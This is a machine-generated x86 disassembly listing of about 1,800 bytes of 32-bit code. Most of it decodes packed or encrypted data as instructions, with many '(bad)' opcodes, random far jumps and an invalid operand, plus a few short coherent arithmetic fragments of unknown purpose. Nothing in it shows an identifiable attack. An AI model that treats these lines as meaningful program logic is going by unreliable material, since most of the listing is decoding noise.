  40cfc1:	inc    eax
  40cfc2:	add    DWORD PTR [edi-0x39],ebp
  40cfc5:	fmul   st,st(7)
  40cfc7:	test   BYTE PTR [esi+0x5b],dh
  40cfca:	cmp    al,0x8c
  40cfcc:	jnp    0x40d022
  40cfce:	jb     0x40cfc2
  40cfd0:	pop    esp
  40cfd1:	arpl   WORD PTR [edi+eiz*4-0x25],cx
  40cfd5:	sbb    edi,DWORD PTR ss:[ebx+0x15c8f00f]
  40cfdc:	mov    al,ds:0xb0aaf93d
  40cfe1:	push   cs
  40cfe2:	(bad)  
  40cfe3:	fiadd  WORD PTR [eax-0x6461ca8f]
  40cfe9:	ret    
  40cfea:	fwait
  40cfeb:	imul   esp,DWORD PTR [ecx],0xffffffcf
  40cfee:	mov    al,ds:0xb50bb2b0
  40cff3:	inc    esp
  40cff4:	inc    edi
  40cff5:	mov    ch,0x9a
  40cff7:	pusha  
  40cff8:	or     eax,0x619a9015
  40cffd:	xchg   ebx,eax
  40cffe:	mov    WORD PTR [esi-0x5f],ss
  40d001:	sub    esi,0x1d
  40d004:	hlt    
  40d005:	xor    ch,BYTE PTR [esi+ecx*8]
  40d008:	mov    ecx,0x15b6fd28
  40d00d:	dec    ebx
  40d00e:	stos   DWORD PTR es:[edi],eax
  40d00f:	test   eax,ebp
  40d011:	mov    edi,0xe6722ec5
  40d016:	ret    0x35c9
  40d019:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d01a:	mov    al,0x7d
  40d01c:	das    
  40d01d:	(bad)  
  40d01e:	mov    DWORD PTR [eax],ebp
  40d020:	scas   al,BYTE PTR es:[edi]
  40d021:	retf   
  40d022:	call   0xe55a:0xd2420c28
  40d029:	sbb    edx,DWORD PTR [esi+0x15]
  40d02c:	cmp    edx,edi
  40d02e:	pop    edi
  40d02f:	pushw  ds
  40d031:	xchg   edi,eax
  40d032:	mov    dh,0xf8
  40d034:	loope  0x40d036
  40d036:	nop
  40d037:	cmp    al,0x67
  40d039:	das    
  40d03a:	push   esp
  40d03b:	sbb    bh,BYTE PTR [edi-0x5b7e1bc]
  40d041:	adc    eax,0x54271939
  40d046:	mul    BYTE PTR [edi]
  40d048:	icebp  
  40d049:	ror    BYTE PTR [ebx-0xc1b3089],cl
  40d04f:	sub    al,0xa8
  40d051:	mov    dh,0xd9
  40d053:	and    BYTE PTR [edi-0x5c],cl
  40d056:	xor    eax,0x610fb714
  40d05b:	cli    
  40d05c:	add    al,0x34
  40d05e:	int    0x54
  40d060:	mul    BYTE PTR [edx-0x7e]
  40d063:	jl     0x40d042
  40d065:	sub    ch,BYTE PTR [edx]
  40d067:	fwait
  40d068:	jmp    0x40d05d
  40d06a:	push   edx
  40d06b:	dec    edi
  40d06c:	outs   dx,DWORD PTR ds:[esi]
  40d06d:	nop
  40d06e:	push   esp
  40d06f:	cmp    esp,DWORD PTR [esi]
  40d071:	jecxz  0x40d0b3
  40d073:	dec    ebp
  40d074:	retf   0x78fc
  40d077:	stc    
  40d078:	ins    DWORD PTR es:[edi],dx
  40d079:	and    dl,BYTE PTR [esi+0x3eb1e000]
  40d07f:	cld    
  40d080:	ret    
  40d081:	xchg   esi,eax
  40d082:	jns    0x40d069
  40d084:	stc    
  40d085:	dec    esp
  40d086:	jo     0x40d05e
  40d088:	cli    
  40d089:	cmp    ah,BYTE PTR [eax]
  40d08b:	ret    
  40d08c:	xor    BYTE PTR [eax],ah
  40d08e:	enter  0x8efd,0x14
  40d092:	(bad)  
  40d094:	mov    ah,BYTE PTR [esi+esi*2-0xa]
  40d098:	mov    DWORD PTR [ebx-0x2722e543],ebp
  40d09e:	adc    edx,DWORD PTR [ebp+0x2]
  40d0a1:	pop    ebp
  40d0a2:	sbb    ebx,edi
  40d0a4:	pusha  
  40d0a5:	push   ds
  40d0a6:	into   
  40d0a7:	add    ah,BYTE PTR [esi+eax*4]
  40d0aa:	pop    ecx
  40d0ab:	sbb    eax,0x3a22d8a
  40d0b0:	mov    DWORD PTR [esi-0x46],ebp
  40d0b3:	cwde   
  40d0b4:	stos   DWORD PTR es:[edi],eax
  40d0b5:	out    dx,al
  40d0b6:	sahf   
  40d0b7:	xor    al,0x7f
  40d0b9:	or     al,BYTE PTR [ecx]
  40d0bb:	pop    esp
  40d0bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0bd:	fs (bad) 
  40d0bf:	shl    edx,1
  40d0c1:	in     al,0x2a
  40d0c3:	push   eax
  40d0c4:	scas   al,BYTE PTR es:[edi]
  40d0c5:	push   0x54
  40d0c7:	jg     0x40d095
  40d0c9:	call   0xdc51c9b4
  40d0ce:	ror    DWORD PTR [ebx+0x24845bf1],0x28
  40d0d5:	or     DWORD PTR [eax-0x7a],edx
  40d0d8:	inc    esi
  40d0d9:	inc    eax
  40d0da:	(bad)  
  40d0db:	xor    al,0xaf
  40d0dd:	cdq    
  40d0de:	xchg   ebx,eax
  40d0df:	test   al,0xd8
  40d0e1:	xchg   BYTE PTR [ecx-0x245f76dd],bl
  40d0e7:	xor    BYTE PTR [esi],0x7a
  40d0ea:	ss call 0xf944e9e8
  40d0f0:	xchg   DWORD PTR ds:0x4fbc436,ecx
  40d0f6:	or     DWORD PTR [ebp-0x3735a046],0xd71c01f6
  40d100:	or     dl,BYTE PTR [eax+edi*1]
  40d103:	cdq    
  40d104:	nop
  40d105:	xor    al,BYTE PTR [edi-0x48ec719e]
  40d10b:	mov    esi,0xa0b12609
  40d110:	shl    DWORD PTR [edx-0x30],cl
  40d113:	inc    ecx
  40d114:	mov    edx,0x58f2aa19
  40d119:	sti    
  40d11a:	aaa    
  40d11b:	lock popf 
  40d11d:	inc    esi
  40d11e:	jmp    0x82f4:0xb0c7bccc
  40d125:	stc    
  40d126:	fprem  
  40d128:	arpl   WORD PTR [ecx+0x3c],cx
  40d12b:	or     eax,0xe0f82d3f
  40d130:	adc    ebx,DWORD PTR [ecx-0x24]
  40d133:	add    esp,DWORD PTR [bx+si+0x20c7]
  40d138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d139:	jae    0x40d1a4
  40d13b:	(bad)
  40d13e:	clc    
  40d13f:	or     ah,al
  40d141:	xchg   ecx,eax
  40d142:	push   edx
  40d143:	and    dl,dl
  40d145:	mov    ah,0xeb
  40d147:	fs bnd repz jbe 0x40d163
  40d14c:	lods   al,BYTE PTR ds:[esi]
  40d14d:	push   ebx
  40d14e:	sub    BYTE PTR [esi+ebp*4+0x6b1dbb2],dh
  40d155:	js     0x40d165
  40d157:	cwde   
  40d158:	ror    ebx,0x7a
  40d15b:	sbb    ecx,DWORD PTR [eax]
  40d15d:	pop    eax
  40d15e:	je     0x40d1d5
  40d160:	fcomp  QWORD PTR [edi+0x9]
  40d163:	push   0xa827d1cf
  40d168:	inc    edi
  40d169:	pop    esp
  40d16a:	mov    eax,0x3bad7352
  40d16f:	or     ebx,DWORD PTR [ebx]
  40d171:	fmul   DWORD PTR [esi-0x52]
  40d174:	mov    ?,WORD PTR [ebp+0x3a6f5707]
  40d17a:	fwait
  40d17b:	jge    0x40d113
  40d17d:	pop    eax
  40d17e:	test   eax,0xb01f0169
  40d183:	icebp  
  40d184:	stc    
  40d185:	mov    bl,0x72
  40d187:	fcomi  st,st(1)
  40d189:	test   al,0xe9
  40d18b:	adc    esp,DWORD PTR [eax+0x32]
  40d18e:	or     edx,0x5456f74
  40d194:	xor    esi,DWORD PTR [esi-0x398c69b7]
  40d19a:	mov    al,ds:0xd2046711
  40d19f:	fstp   st(7)
  40d1a1:	dec    ecx
  40d1a2:	rcr    BYTE PTR [edi-0x72730bbf],cl
  40d1a8:	test   eax,0x550e27fd
  40d1ad:	outs   dx,BYTE PTR ds:[esi]
  40d1ae:	adc    BYTE PTR [ecx],dh
  40d1b0:	cli    
  40d1b1:	pop    ebp
  40d1b2:	mov    esi,0x2d715a29
  40d1b7:	fist   DWORD PTR [ebp+0x7d9f8ffa]
  40d1bd:	repnz cmp eax,0x8290d0d1
  40d1c3:	loopne 0x40d1f9
  40d1c5:	stos   BYTE PTR es:[edi],al
  40d1c6:	je     0x40d1ba
  40d1c8:	loop   0x40d21c
  40d1ca:	addr16 push ds
  40d1cc:	mov    DWORD PTR [edi-0x4397a7d3],edx
  40d1d2:	enter  0xe669,0x3b
  40d1d6:	(bad)
  40d1db:	adc    eax,0x33a3c23e
  40d1e0:	rol    BYTE PTR [ebx],1
  40d1e2:	ror    DWORD PTR [edi],1
  40d1e4:	scas   eax,DWORD PTR es:[edi]
  40d1e5:	xlat   BYTE PTR ds:[ebx]
  40d1e6:	mov    edi,DWORD PTR [ebp-0xc]
  40d1e9:	xor    edi,eax
  40d1eb:	sub    edx,edi
  40d1ed:	mov    edi,DWORD PTR [ebp-0xc]
  40d1f0:	mov    ebx,DWORD PTR [ebp-0x14]
  40d1f3:	xor    edi,eax
  40d1f5:	add    edi,ecx
  40d1f7:	imul   edi,ebx
  40d1fa:	mov    ebx,DWORD PTR [ebp-0x18]
  40d1fd:	jmp    0x40d614
  40d202:	pop    esi
  40d203:	in     al,0x48
  40d205:	add    BYTE PTR [esp+edi*4+0x76],dl
  40d209:	ins    BYTE PTR es:[edi],dx
  40d20a:	xor    edx,DWORD PTR [ecx]
  40d20c:	fcmovb st,st(2)
  40d20e:	(bad)  
  40d20f:	or     eax,0x9ac6f91c
  40d214:	jle    0x40d294
  40d216:	jo     0x40d291
  40d218:	jle    0x40d298
  40d21a:	call   ebx
  40d21c:	(bad)  
  40d21d:	dec    ebp
  40d21e:	scas   eax,DWORD PTR es:[edi]
  40d21f:	jno    0x40d1aa
  40d221:	mov    esp,0x5114f1bd
  40d226:	les    ebx,FWORD PTR [eax]
  40d228:	xor    al,0xc5
  40d22a:	mov    al,0xb6
  40d22c:	and    edi,DWORD PTR [ebx]
  40d22e:	js     0x40d201
  40d230:	mov    bh,0xc3
  40d232:	out    dx,al
  40d233:	out    0x93,al
  40d235:	xlat   BYTE PTR ds:[ebx]
  40d236:	ss cs mov ebp,eax
  40d23a:	mov    ebp,0x2e01ee9b
  40d23f:	mov    cl,0xfa
  40d241:	leave  
  40d242:	dec    esp
  40d243:	ds js  0x40d242
  40d246:	ret    0x494e
  40d249:	and    ch,al
  40d24b:	sub    eax,0x93cbb342
  40d250:	jecxz  0x40d228
  40d252:	ds jo  0x40d234
  40d255:	ret    0x3f3c
  40d258:	neg    DWORD PTR [ebx-0x4e0fa8ad]
  40d25e:	call   0x5961f133
  40d263:	xchg   ch,dh
  40d265:	sahf   
  40d266:	loop   0x40d282
  40d268:	add    bh,ah
  40d26a:	mov    BYTE PTR [ebp+0x20034cf4],dh
  40d270:	popa   
  40d271:	iret   
  40d272:	adc    eax,0x102c208e
  40d277:	hlt    
  40d278:	jg     0x40d28f
  40d27a:	dec    edi
  40d27b:	lea    ebp,[eax-0x11ac5714]
  40d281:	or     edx,DWORD PTR [ecx+0x6a71e778]
  40d287:	sub    ecx,DWORD PTR [edi]
  40d289:	out    0x99,eax
  40d28b:	pop    esp
  40d28c:	push   ecx
  40d28d:	xor    DWORD PTR [eax+eiz*1+0x3],ebp
  40d291:	push   DWORD PTR [eax-0x476c7952]
  40d297:	inc    ebp
  40d298:	dec    di
  40d29a:	shl    cl,1
  40d29c:	inc    ebx
  40d29d:	pop    es
  40d29e:	and    edi,0x62e1ab62
  40d2a4:	mov    gs,WORD PTR [edi-0x66c8bee0]
  40d2aa:	ret    
  40d2ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2ac:	mov    es,WORD PTR ds:0x9814b5b7
  40d2b2:	mov    ch,0x8e
  40d2b4:	pop    edx
  40d2b5:	push   esi
  40d2b6:	fs iret 
  40d2b8:	fld    DWORD PTR [esi-0x7b]
  40d2bb:	retf   0x570b
  40d2be:	repz sub eax,0xd9b89eb2
  40d2c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2c5:	sub    DWORD PTR [ebx],0x92e07e51
  40d2cb:	fwait
  40d2cc:	mov    eax,ds:0x54b81a72
  40d2d1:	icebp  
  40d2d2:	lds    ecx,FWORD PTR [eax-0x18]
  40d2d5:	sub    DWORD PTR [esi+0x3d],0xffffffe0
  40d2d9:	pop    esp
  40d2da:	retf   0x5e39
  40d2dd:	jbe    0x40d349
  40d2df:	std    
  40d2e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2e1:	enter  0xbf0e,0x9e
  40d2e5:	and    ch,BYTE PTR [eax+0x15]
  40d2e8:	je     0x40d30b
  40d2ea:	idiv   BYTE PTR [ebp-0x5]
  40d2ed:	dec    ebx
  40d2ee:	sbb    DWORD PTR ds:0xaab47b95,ebx
  40d2f4:	mov    ecx,DWORD PTR [esi+0x340c1221]
  40d2fa:	mov    eax,DWORD PTR [ebx+0x16]
  40d2fd:	outs   dx,DWORD PTR ds:[esi]
  40d2fe:	cld    
  40d2ff:	xlat   BYTE PTR ds:[ebx]
  40d300:	ja     0x40d327
  40d302:	scas   eax,DWORD PTR es:[edi]
  40d303:	xor    cl,BYTE PTR [ecx+0x67c72274]
  40d309:	push   esi
  40d30a:	inc    esp
  40d30b:	add    al,0x3c
  40d30d:	outs   dx,BYTE PTR ds:[esi]
  40d30e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d30f:	add    DWORD PTR [eax],edi
  40d311:	lds    esp,FWORD PTR [edi+ebx*2-0x3d467d9a]
  40d318:	jmp    0x40d2fc
  40d31a:	pop    ebp
  40d31b:	outs   dx,BYTE PTR ds:[esi]
  40d31c:	inc    ebp
  40d31d:	cmp    BYTE PTR [ebx-0x1ffff0ca],ah
  40d323:	fisttp QWORD PTR [eax+0x57]
  40d326:	add    BYTE PTR ds:0x1f5af589,cl
  40d32c:	ret    
  40d32d:	je     0x40d2e8
  40d32f:	sub    ecx,edi
  40d331:	loopne 0x40d2c9
  40d333:	push   eax
  40d334:	sbb    al,0xc0
  40d336:	(bad)  
  40d337:	iret   
  40d338:	xchg   edi,eax
  40d339:	fisttp DWORD PTR [ebx+ecx*2]
  40d33c:	ds push edi
  40d33e:	(bad)
  40d341:	dec    esi
  40d342:	fwait
  40d343:	ins    BYTE PTR es:[edi],dx
  40d344:	push   esi
  40d345:	mov    ds:0xce229a36,al
  40d34a:	mov    ch,0xcc
  40d34c:	iret   
  40d34d:	clc    
  40d34e:	jae    0x40d3af
  40d350:	ins    DWORD PTR es:[edi],dx
  40d351:	push   cs
  40d352:	cmp    eax,0x6e01000b
  40d357:	fldcw  WORD PTR [eax+0x72]
  40d35a:	fisttp WORD PTR [ebx+0x2efde2db]
  40d360:	xchg   esi,eax
  40d361:	pop    esp
  40d362:	test   al,0xae
  40d364:	mov    ah,0x1f
  40d366:	push   edi
  40d367:	jae    0x40d3a1
  40d369:	or     eax,0xbd1cac1c
  40d36e:	dec    edi
  40d36f:	xchg   esi,eax
  40d370:	(bad)  
  40d371:	pop    ebx
  40d372:	into   
  40d373:	sub    al,0x4b
  40d375:	je     0x40d35b
  40d377:	add    ch,dh
  40d379:	cdq    
  40d37a:	add    BYTE PTR [edx],ah
  40d37c:	push   esi
  40d37d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d37e:	jmp    0x6bf7:0x59f63aac
  40d385:	icebp  
  40d386:	hlt    
  40d387:	mov    BYTE PTR [edx+0xf],cl
  40d38a:	xor    DWORD PTR [edi],eax
  40d38c:	pop    eax
  40d38d:	sbb    DWORD PTR [eax+edi*1],esi
  40d390:	ja     0x40d348
  40d392:	mov    dh,BYTE PTR [ecx]
  40d394:	cmp    DWORD PTR [ebp+ebp*8+0x41],edi
  40d398:	cmp    BYTE PTR [ebx+eax*2],cl
  40d39b:	in     eax,0xc0
  40d39d:	and    DWORD PTR ds:[esi+edi*8-0x23],edx
  40d3a2:	les    eax,FWORD PTR [ebx+0x29]
  40d3a5:	mov    ds:0xe7f639c8,eax
  40d3aa:	in     al,0x68
  40d3ac:	mov    edx,0x3fdd990
  40d3b1:	push   0xf9b56cb8
  40d3b6:	jno    0x40d436
  40d3b8:	pop    ebx
  40d3b9:	xor    bl,bl
  40d3bb:	jmp    0xd13:0x729a478b
  40d3c2:	mov    al,cl
  40d3c4:	mov    BYTE PTR [ecx+eax*8],cl
  40d3c7:	sub    eax,0xce1a1395
  40d3cc:	daa    
  40d3cd:	fld    TBYTE PTR [edx]
  40d3cf:	mov    bh,0x1d
  40d3d1:	cwde   
  40d3d2:	fdivr  st,st(0)
  40d3d4:	nop
  40d3d5:	repz push edi
  40d3d7:	jmp    0xcb72:0x7a51fd86
  40d3de:	data16 fisub DWORD PTR [ebx-0x36]
  40d3e2:	mov    ecx,0x1b8f76a3
  40d3e7:	not    al
  40d3e9:	or     al,0x97
  40d3eb:	add    BYTE PTR [edx-0x46],bh
  40d3ee:	int    0x88
  40d3f0:	mov    al,ds:0xa9a481d7
  40d3f5:	push   eax
  40d3f6:	arpl   WORD PTR [edi],ax
  40d3f8:	mov    dh,dl
  40d3fa:	xor    al,0xed
  40d3fc:	mov    dh,0xc2
  40d3fe:	rcl    dh,cl
  40d400:	mov    dh,0x75
  40d402:	test   al,0x8b
  40d404:	ss in  eax,0x49
  40d407:	jae    0x40d42f
  40d409:	pop    ebx
  40d40a:	sar    esp,1
  40d40c:	jno    0x40d408
  40d40e:	cld    
  40d40f:	(bad)  
  40d412:	sub    bh,0x86
  40d415:	retf   0x374a
  40d418:	xor    DWORD PTR [eax],esp
  40d41a:	out    0x8e,eax
  40d41c:	rcr    ebx,0x3f
  40d41f:	cmp    BYTE PTR [ebp+0x26],bl
  40d422:	imul   esp,DWORD PTR [eax-0x6245d965],0xffffffce
  40d429:	pop    esi
  40d42a:	iret   
  40d42b:	adc    eax,0x22b04e84
  40d430:	adc    cl,al
  40d432:	in     eax,dx
  40d433:	adc    al,0xdb
  40d435:	mov    esi,0x2c9fcf13
  40d43a:	fild   DWORD PTR [ebx+0x230b48ae]
  40d440:	das    
  40d441:	add    esi,DWORD PTR [edx+0x64]
  40d444:	mov    cl,BYTE PTR [esp+ebx*4]
  40d447:	out    0xe5,al
  40d449:	mov    esp,0x20be9f6d
  40d44e:	jnp    0x40d415
  40d450:	fwait
  40d451:	push   eax
  40d452:	fnstsw WORD PTR [ecx]
  40d454:	scas   eax,DWORD PTR es:[edi]
  40d455:	add    bl,BYTE PTR [edi+0x1d]
  40d458:	inc    eax
  40d459:	jle    0x40d3df
  40d45b:	cld    
  40d45c:	mov    bl,0x9
  40d45e:	test   eax,0xb0e397e5
  40d463:	inc    edi
  40d464:	and    eax,0x4ac92db3
  40d469:	jge    0x40d40d
  40d46b:	jmp    0x1292:0x9da0cdd8
  40d472:	jg     0x40d4aa
  40d474:	inc    esp
  40d475:	sbb    eax,0xc7a0075e
  40d47a:	stos   DWORD PTR es:[edi],eax
  40d47b:	sub    al,0x46
  40d47d:	stos   BYTE PTR es:[edi],al
  40d47e:	jb     0x40d4d0
  40d480:	and    DWORD PTR [ebx],0xffffffe3
  40d483:	inc    edx
  40d484:	pop    es
  40d485:	mov    DWORD PTR [ecx-0x3269403d],0x746d3d98
  40d48f:	repz sub al,0xa1
  40d492:	xchg   edi,eax
  40d493:	loop   0x40d498
  40d495:	out    0x51,al
  40d497:	cmp    cl,BYTE PTR [esi+0x3dbcc65e]
  40d49d:	cmp    dh,BYTE PTR [edi]
  40d49f:	xor    al,0xb0
  40d4a1:	adc    DWORD PTR [ebx+ecx*2+0x547d7839],ebx
  40d4a8:	aas    
  40d4a9:	mov    ah,0xc6
  40d4ab:	pop    ecx
  40d4ac:	sbb    al,0xdc
  40d4ae:	mov    ebp,0x1d31287f
  40d4b3:	inc    ecx
  40d4b4:	lahf   
  40d4b5:	imul   eax,DWORD PTR es:[ebx],0x4ce692b5
  40d4bc:	mov    esi,0xd957acf3
  40d4c1:	adc    ah,BYTE PTR [edi+ebp*4+0x7d]
  40d4c5:	sub    DWORD PTR [eax+0x5f],eax
  40d4c8:	mov    ch,0xf
  40d4ca:	adc    dl,BYTE PTR [ecx+0x2c0a1653]
  40d4d0:	push   eax
  40d4d1:	sbb    eax,0xe246a608
  40d4d6:	lea    esi,[eax+0x13]
  40d4d9:	push   esp
  40d4da:	mov    al,ds:0xa8084c30
  40d4df:	pop    ecx
  40d4e0:	ins    BYTE PTR es:[edi],dx
  40d4e1:	sub    ecx,DWORD PTR [ecx+edi*4-0x1e]
  40d4e5:	out    dx,al
  40d4e6:	aaa    
  40d4e7:	arpl   WORD PTR [ebp+0x7193546b],si
  40d4ed:	stos   BYTE PTR es:[edi],al
  40d4ee:	into   
  40d4ef:	push   ecx
  40d4f0:	mov    ebp,0xfb8e313f
  40d4f5:	mov    dl,0x7a
  40d4f7:	dec    esi
  40d4f8:	bound  esp,QWORD PTR [esp+ecx*1+0x45]
  40d4fc:	pop    ebp
  40d4fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4fe:	jge    0x40d4d9
  40d500:	xlat   BYTE PTR ds:[ebx]
  40d501:	adc    DWORD PTR [ebp-0x27],ebx
  40d504:	mov    ecx,ecx
  40d506:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d507:	dec    eax
  40d508:	cwde   
  40d509:	cmp    ecx,DWORD PTR [ebp+0x4caf4121]
  40d50f:	ret    0xb2c7
  40d512:	or     dl,BYTE PTR [ebx-0x2088bedc]
  40d518:	xor    dl,ch
  40d51a:	cwde   
  40d51b:	dec    esp
  40d51c:	ss aad 0x2d
  40d51f:	cwde   
  40d520:	mov    edx,DWORD PTR [eax-0x15b80758]
  40d526:	loope  0x40d52c
  40d528:	imul   DWORD PTR gs:[ebx+0x44202a30]
  40d52f:	lds    esi,FWORD PTR [ecx]
  40d531:	mov    es,WORD PTR [edx+0x77]
  40d534:	stos   DWORD PTR es:[edi],eax
  40d535:	cmp    al,0x76
  40d537:	jbe    0x40d520
  40d539:	(bad)  
  40d53a:	cmp    al,0xa1
  40d53c:	lods   eax,DWORD PTR ds:[esi]
  40d53d:	inc    ebp
  40d53e:	mov    esi,0x19475ea1
  40d543:	ret    0xbe01
  40d546:	fsub   DWORD PTR [esi-0x14]
  40d549:	xor    BYTE PTR [edx],bl
  40d54b:	or     eax,0x65ccd0cf
  40d550:	add    al,0xfa
  40d552:	xor    al,0xe4
  40d554:	inc    edi
  40d555:	mov    ebx,0x7a5c9fba
  40d55a:	dec    ecx
  40d55b:	jns    0x40d599
  40d55d:	push   ds
  40d55e:	jge    0x40d557
  40d560:	xchg   DWORD PTR [eax],ebp
  40d562:	push   edx
  40d563:	sub    al,0x7c
  40d565:	imul   esp,edi,0xffffffee
  40d568:	inc    edi
  40d569:	inc    edx
  40d56a:	sub    esi,ebx
  40d56c:	aam    0x51
  40d56e:	retf   
  40d56f:	out    dx,eax
  40d570:	rcl    DWORD PTR [eax],1
  40d572:	in     al,dx
  40d573:	repz jl 0x40d578
  40d576:	mov    bh,0x8
  40d578:	xchg   BYTE PTR ds:0xbe8fe90b,dh
  40d57e:	sub    ah,bl
  40d580:	nop
  40d581:	push   ds
  40d582:	add    eax,0x8db15dce
  40d587:	call   0xff3123d2
  40d58c:	xor    ebp,edx
  40d58e:	cs dec ebp
  40d590:	dec    edx
  40d591:	in     al,0xbd
  40d593:	mov    dh,0x21
  40d595:	and    DWORD PTR [ecx],0xffffff96
  40d598:	lods   al,BYTE PTR ds:[esi]
  40d599:	sub    al,0x4e
  40d59b:	xor    cl,BYTE PTR [ecx+0x61]
  40d59e:	xor    DWORD PTR [ebx+0x3294f16c],ebp
  40d5a4:	outs   dx,DWORD PTR ds:[esi]
  40d5a5:	lods   al,BYTE PTR ds:[esi]
  40d5a6:	pushf  
  40d5a7:	gs aaa 
  40d5a9:	sbb    ebx,DWORD PTR [edx-0xfc0f1bb]
  40d5af:	in     al,dx
  40d5b0:	ds jbe 0x40d605
  40d5b3:	and    eax,0x5cdbc9e8
  40d5b8:	stos   BYTE PTR es:[edi],al
  40d5b9:	mul    DWORD PTR gs:[esi+0x72be088d]
  40d5c0:	(bad)  
  40d5c1:	and    ebx,eax
  40d5c3:	mov    bl,0xf3
  40d5c5:	push   esp
  40d5c6:	jno    0x40d5f6
  40d5c8:	push   esi
  40d5c9:	jnp    0x40d5f8
  40d5cb:	jbe    0x40d5ed
  40d5cd:	adc    ebp,DWORD PTR [ecx-0x72f438cd]
  40d5d3:	nop
  40d5d4:	cdq    
  40d5d5:	push   esi
  40d5d6:	or     edx,ecx
  40d5d8:	add    DWORD PTR [edi-0x48],ecx
  40d5db:	jle    0x40d5b3
  40d5dd:	es inc eax
  40d5df:	js     0x40d5e7
  40d5e1:	sub    BYTE PTR [eax+0x75],bh
  40d5e4:	push   ss
  40d5e5:	cwde   
  40d5e6:	jmp    0x2a65:0x88fb3bb6
  40d5ed:	fild   QWORD PTR [eax+eiz*8]
  40d5f0:	xchg   ebx,eax
  40d5f1:	mov    ch,0xea
  40d5f3:	clc    
  40d5f4:	inc    ebx
  40d5f5:	dec    esi
  40d5f6:	cmc    
  40d5f7:	mov    cl,0xbc
  40d5f9:	test   al,0xc8
  40d5fb:	jno    0x40d672
  40d5fd:	mov    ch,0x37
  40d5ff:	pop    ebx
  40d600:	adc    al,0xe0
  40d602:	push   es
  40d603:	mov    esp,0x8b211a9e
  40d608:	xchg   ebp,eax
  40d609:	xchg   esi,eax
  40d60a:	sub    al,0x3c
  40d60c:	pop    ds
  40d60d:	inc    esp
  40d60e:	lahf   
  40d60f:	sbb    BYTE PTR [esp+ecx*4-0x27cc8f6f],0x2b
  40d617:	ror    DWORD PTR [ebp+0x72991fbc],1
  40d61d:	xor    al,BYTE PTR [eax]
  40d61f:	cmp    edi,edx
  40d621:	jbe    0x40c529
  40d627:	mov    edx,DWORD PTR [ebp-0xc]
  40d62a:	mov    edi,DWORD PTR [ebp-0x24]
  40d62d:	xor    edx,eax
  40d62f:	add    edx,ecx
  40d631:	imul   edx,edi
  40d634:	mov    edi,DWORD PTR [ebp-0x18]
  40d637:	jmp    0x40da4e
  40d63c:	(bad)  
  40d63d:	pusha  
  40d63e:	jecxz  0x40d614
  40d640:	jge    0x40d697
  40d642:	icebp  
  40d643:	ins    BYTE PTR es:[edi],dx
  40d644:	(bad)  
  40d645:	fwait
  40d646:	mov    edi,0x686f0798
  40d64b:	sub    BYTE PTR [eax],bh
  40d64d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d64e:	jle    0x40d6ce
  40d650:	jo     0x40d6cb
  40d652:	jle    0x40d6d2
  40d654:	mov    ds:0xfa3f6fe1,eax
  40d659:	shl    BYTE PTR [edx+edi*8-0xa],1
  40d65d:	mov    cl,0x4f
  40d65f:	aam    0x82
  40d661:	jbe    0x40d678
  40d663:	sub    bh,BYTE PTR [ebp+0x67af56c4]
  40d669:	xchg   edx,eax
  40d66a:	stos   BYTE PTR es:[edi],al
  40d66b:	or     al,0xe4
  40d66d:	imul   edx,DWORD PTR [ecx+0x3acaabc2],0x958d1bcb
  40d677:	dec    ebp
  40d678:	ror    DWORD PTR [ecx+0x5d],0x9
  40d67c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d67d:	push   0x87c2f87d
  40d682:	in     eax,0x40
  40d684:	es dec edx
  40d686:	out    dx,al
  40d687:	sahf   
  40d688:	inc    ecx
  40d689:	and    DWORD PTR fs:[esi-0x33c37ed4],esp
  40d690:	mov    al,ds:0xf7d00413
  40d695:	push   edx
  40d696:	dec    ebp
  40d697:	fisttp QWORD PTR [edi+0x700b4ee8]
  40d69d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d69e:	loop   0x40d65b
  40d6a0:	inc    ebx
  40d6a1:	stos   DWORD PTR es:[edi],eax
  40d6a2:	dec    edx
  40d6a3:	mov    bh,BYTE PTR ds:[ecx-0x8]
  40d6a7:	scas   al,BYTE PTR es:[edi]
  40d6a8:	sbb    DWORD PTR [ebp+0x3],edx
  40d6ab:	or     DWORD PTR [eax+0x7e],esp
  40d6ae:	xchg   esp,eax
  40d6af:	inc    ecx
  40d6b0:	pop    esi
  40d6b1:	adc    DWORD PTR [ebx],0x45ee11ae
  40d6b7:	mov    esp,0xa0fe6b6b
  40d6bc:	sub    eax,0xe8fd0ea6
  40d6c1:	adc    ah,BYTE PTR [ebp+ecx*8-0x60]
  40d6c5:	loop   0x40d717
  40d6c7:	cmp    BYTE PTR [eax-0x37],0x84
  40d6cb:	pop    ebp
  40d6cc:	pop    ds
  40d6cd:	pop    ebp
  40d6ce:	shl    BYTE PTR [ecx+edi*2+0x3a33dbbd],cl
  40d6d5:	or     bl,dl
  40d6d7:	mov    ecx,DWORD PTR [ebx]
  40d6d9:	mov    BYTE PTR [ecx+0x34],dl
  40d6dc:	xor    edi,DWORD PTR [edi-0x2110d7c6]
  40d6e2:	js     0x40d729
  40d6e4:	outs   dx,BYTE PTR ds:[esi]
  40d6e5:	xor    BYTE PTR [edi+0x36],ah
  40d6e8:	outs   dx,BYTE PTR ds:[esi]
  40d6e9:	jg     0x40d72e
  40d6eb:	(bad)  
  40d6ed:	iret   
  40d6ee:	dec    edx
  40d6ef:	xchg   ecx,eax
  40d6f0:	add    BYTE PTR [ebp+edx*8-0x5b],ah
  40d6f4:	jb     0x40d6a3
  40d6f6:	add    cl,BYTE PTR [edx+0x69]
  40d6f9:	jg     0x40d6eb
  40d6fb:	shr    BYTE PTR ds:0x7258f947,0x6d
  40d702:	mov    ebx,0xea129754
  40d707:	call   0x6b39971f
  40d70c:	xor    eax,0x4b7eeb86
  40d711:	adc    eax,0x61e9c301
  40d716:	cwde   
  40d717:	jmp    0x7304:0x272b3b3b
  40d71e:	push   esi
